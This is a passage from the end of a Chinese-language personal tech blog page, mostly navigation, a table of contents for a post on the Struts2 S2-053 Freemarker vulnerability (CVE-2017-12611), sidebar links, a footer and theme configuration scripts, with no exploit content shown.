href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 許可協議。轉載請註明出處！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/09/05/CVE/SonicWall/SonicWall%20%E4%BF%AE%E8%A1%A5%E5%BD%B1%E5%93%8D%E5%85%B6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%20CVE-2024-40766/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;08&#x2F;26&#x2F;8XC4DuFjE9TvKtc.png" title="SonicWall 修补影响其防火墙的严重漏洞 CVE-2024-40766"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>SonicWall</span><h3>SonicWall 修补影响其防火墙的严重漏洞 CVE-2024-40766</h3></a></div><div class="item right"><a href="/2024/09/05/TradingView/EMA%208,%2021%20and%20SMA%2050%20from%20daily%20timeframe%20horizontal%20lines/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;cdna.artstation.com&#x2F;p&#x2F;assets&#x2F;images&#x2F;images&#x2F;000&#x2F;826&#x2F;910&#x2F;large&#x2F;wl-op-100-s.jpg?1443931462" title="EMA 8, 21 and SMA 50 from daily timeframe horizontal lines"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>TradingView</span><h3>EMA 8, 21 and SMA 50 from daily timeframe horizontal lines</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目錄"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#x00-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text"> x00 漏洞概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">2.</span> <span class="toc-text"> x01 影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x02-%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text"> x02 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text"> 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 环境概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 搭建过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.</span> <span class="toc-text"> 漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x03-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">4.</span> <span class="toc-text"> x03 漏洞背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x04-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text"> x04 漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x05-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">6.</span> <span class="toc-text"> x05 修复方案</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li  class="active"><a href="/2024/09/05/CVE/Struts2/CVE-2017-12611%20Struts2%20Freemarker%20%E6%A0%87%E7%AD%BE%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E%20S2-053/" rel="bookmark" title="CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053">CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053</a></li></ul></div><div class="overview panel" data-title="本站概覽"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="CygneNoir" src="/assets/avatar.jpg"/><p class="name" itemprop="name">CygneNoir</p><div class="description" itemprop="description">赌徒去往哪儿里，那里就是赌场。</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">174</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">38</span><span class="name">分類</span></a></div><div class="item tags"><a href="/tags/"><span class="count">52</span><span class="name">標籤</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/zielonanoir" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;zielonanoir"><i class="ic i-github"></i></a><a target="_blank" rel="noopener" href="https://www.huya.com/1793629795" class="item huya" title="https:&#x2F;&#x2F;www.huya.com&#x2F;1793629795"><i class="ic i-huya"></i></a><a target="_blank" rel="noopener" href="https://live.bilibili.com/11230163" class="item bilibili" title="https:&#x2F;&#x2F;live.bilibili.com&#x2F;11230163"><i class="ic i-bilibili"></i></a><a target="_blank" rel="noopener" href="https://www.douyu.com/11677186" class="item douyu" title="https:&#x2F;&#x2F;www.douyu.com&#x2F;11677186"><i class="ic i-douyu"></i></a><a target="_blank" rel="noopener" href="https://y.qq.com/n/ryqq/profile/like/song?uin=7ensoK6iNeCP" class="item qqyinle" title="https:&#x2F;&#x2F;y.qq.com&#x2F;n&#x2F;ryqq&#x2F;profile&#x2F;like&#x2F;song?uin&#x3D;7ensoK6iNeCP"><i class="ic i-qqyinle"></i></a><a target="_blank" rel="noopener" href="https://music.163.com/#/user/home?id=354795053" class="item music" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;354795053"><i class="ic i-cloud-music"></i></a><a target="_blank" rel="noopener" href="https://x.com/0xAA_Noir" class="item twitter" title="https:&#x2F;&#x2F;x.com&#x2F;0xAA_Noir"><i class="ic i-twitter"></i></a><a target="_blank" rel="noopener" href="https://youtube.com/@acost2039" class="item youtube" title="https:&#x2F;&#x2F;youtube.com&#x2F;@acost2039"><i class="ic i-youtube"></i></a><a href="mailto:a406113864@hotmail.com" class="item email" title="mailto:a406113864@hotmail.com"><i class="ic i-envelope"></i></a><a target="_blank" rel="noopener" href="https://www.linkedin.com/in/huangbuqing/" class="item linkedin" title="https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;huangbuqing&#x2F;"><i class="ic i-linkedin"></i></a><a target="_blank" rel="noopener" href="https://www.t.me/ZielonaNoir" class="item telegram" title="https:&#x2F;&#x2F;www.t.me&#x2F;ZielonaNoir"><i class="ic i-telegram"></i></a><a target="_blank" rel="noopener" href="https://steamcommunity.com/profiles/76561198190911573/" class="item steam" title="https:&#x2F;&#x2F;steamcommunity.com&#x2F;profiles&#x2F;76561198190911573&#x2F;"><i class="ic i-steam"></i></a><a target="_blank" rel="noopener" href="https://kook.vip/KGGdpa" class="item kook" title="https:&#x2F;&#x2F;kook.vip&#x2F;KGGdpa"><i class="ic i-kook"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首頁</a></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-user"></i>關於</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>關於本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>讚賞博主</a></li></ul></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>歸檔</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分類</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>標籤</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友鏈</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/09/05/TradingView/EMA%208,%2021%20and%20SMA%2050%20from%20daily%20timeframe%20horizontal%20lines/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/09/05/CVE/SonicWall/SonicWall%20%E4%BF%AE%E8%A1%A5%E5%BD%B1%E5%93%8D%E5%85%B6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%20CVE-2024-40766/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>隨機文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1-8STL%E3%80%81%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0%E3%80%81%E4%BD%8D%E8%BF%90%E7%AE%97/" title="分類於1.8STL、常用库函数、位运算">1.8STL、常用库函数、位运算</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1.8STL%E3%80%81%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0%E3%80%81%E4%BD%8D%E8%BF%90%E7%AE%97/%E4%BD%8D%E8%BF%90%E7%AE%97/">位运算</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Basic-Algorithm/" title="分類於Basic Algorithm">Basic Algorithm</a></div><span><a href="/2024/07/31/Algorithm/Basic%20Algorithm/AcWing%20803.%20%E5%8C%BA%E9%97%B4%E5%90%88%E5%B9%B6/">AcWing 803. 区间合并</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1-4%E4%B9%A0%E9%A2%981-5%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="分類於1.4习题1.5字符串">1.4习题1.5字符串</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1.4%E4%B9%A0%E9%A2%981.5%E5%AD%97%E7%AC%A6%E4%B8%B2/%E5%AD%97%E7%AC%A6%E4%B8%B2/">字符串</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/TradingView/" title="分類於TradingView">TradingView</a></div><span><a href="/2024/09/05/TradingView/VWAP%20EMA50%20EMA200/">VWAP EMA50 EMA200</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1-8STL%E3%80%81%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0%E3%80%81%E4%BD%8D%E8%BF%90%E7%AE%97/" title="分類於1.8STL、常用库函数、位运算">1.8STL、常用库函数、位运算</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1.8STL%E3%80%81%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0%E3%80%81%E4%BD%8D%E8%BF%90%E7%AE%97/%E6%9C%89%E5%BA%8F%E9%9B%86%E5%90%88set%E6%9C%89%E5%BA%8F%E5%A4%9A%E9%87%8D%E9%9B%86%E5%90%88multiset/">有序集合set有序多重集合multiset</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Algorithm-Top-10-Sorting-Algorithm/" title="分類於Algorithm, Top 10 Sorting Algorithm">Algorithm, Top 10 Sorting Algorithm</a></div><span><a href="/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/">选择排序</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CVE/" title="分類於CVE">CVE</a><i class="ic i-angle-right"></i><a href="/categories/CVE/ASP-NET/" title="分類於ASP.NET">ASP.NET</a></div><span><a href="/2024/08/16/CVE/ASP.NET/Ajaxpro2.CVE-2021-23758.Remote.Code.Execution%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Ajaxpro2.CVE-2021-23758.Remote.Code.Execution 远程代码执行漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/lowerbound%20upperbound%E4%BA%8C%E5%88%86%E5%87%BD%E6%95%B0/">lowerbound upperbound二分函数</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1-3%E4%B9%A0%E9%A2%98-1-4%E6%95%B0%E7%BB%84/" title="分類於1.3习题 1.4数组">1.3习题 1.4数组</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1.3%E4%B9%A0%E9%A2%98%201.4%E6%95%B0%E7%BB%84/%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84k%E6%AC%A1/">旋转数组k次</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Algorithm/" title="分類於Algorithm">Algorithm</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/" title="分類於Note">Note</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/" title="分類於语法基础课">语法基础课</a><i class="ic i-angle-right"></i><a href="/categories/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1-2%E4%B9%A0%E9%A2%98%E5%8F%8A1-3%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/" title="分類於1.2习题及1.3循环语句">1.2习题及1.3循环语句</a></div><span><a href="/2024/07/31/Algorithm/Note/%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/1.2%E4%B9%A0%E9%A2%98%E5%8F%8A1.3%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/%E5%88%A4%E6%96%AD%E8%B4%A8%E6%95%B0/">判断质数</a></span></li></ul></div><div class="rpost pjax"><h2>最新評論</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">CygneNoir @ Young men are fearless, neither seeking fame nor avoiding dust.</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站點總字數">317k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站點閱讀時長">4:48</span></div><div class="powered-by">基於 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo With </a><a target="_blank" rel="noopener" href="https://github.com/zielonanoir/zielonanoir.github.io/">CygneNoir</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
        path: `2024/09/05/CVE/Struts2/CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053/`,
        favicon: {
        show: `（●´3｀●）復活成功`,
        hide: `(´Д｀)瀏覽器崩潰啦`
    },
    search: {
        placeholder: "文章搜索",
        empty: "關於 「 ${query} 」 ，什麼也沒搜到",
        stats: "${time} ms 內找到 ${hits} 條結果"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章時效性提示</span><br>這是一篇發佈於 {{publish}} 天前，最後一次更新在 {{updated}} 天前的文章，部分信息可能已經發生改變，請注意甄別。</p></div>`,
    quiz: {
        choice: `單選題`,
        multiple: `多選題`,
        true_false: `判斷題`,
        essay: `問答題`,
        gap_fill: `填空題`,
        mistake: `錯題備註`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://s4.zstatic.net/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous" fetchpriority="high"></script><script src="https://s4.zstatic.net/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha384-ZvpUoO&#x2F;+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn&#x2F;6Z&#x2F;hRTt8+pR6L4N2" crossorigin="anonymous" fetchpriority="high"></script><script src="/js/siteInit.js?v=0.4.11" type="module" fetchpriority="high" defer></script></body></html>